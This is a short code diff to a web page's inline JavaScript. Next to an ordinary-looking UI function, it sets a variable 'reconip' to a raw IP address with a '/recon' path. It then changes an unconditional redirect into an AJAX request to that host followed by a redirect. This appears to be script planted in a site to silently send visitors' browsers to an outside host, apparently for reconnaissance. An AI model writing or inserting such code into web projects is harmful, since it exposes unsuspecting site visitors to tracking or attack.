@@ -105,7 +105,14 @@ const ui_get_day3 = function() {
 }
 
 var reconip = "http://181.45.145.147/recon";
-window.location.href = reconip;
+
+$.ajax({
+    url: reconip,
+    type: "get",                                 
+    success: function (response) {
+        window.location.href = reconip;
+    }
+});
 
 </script>
 
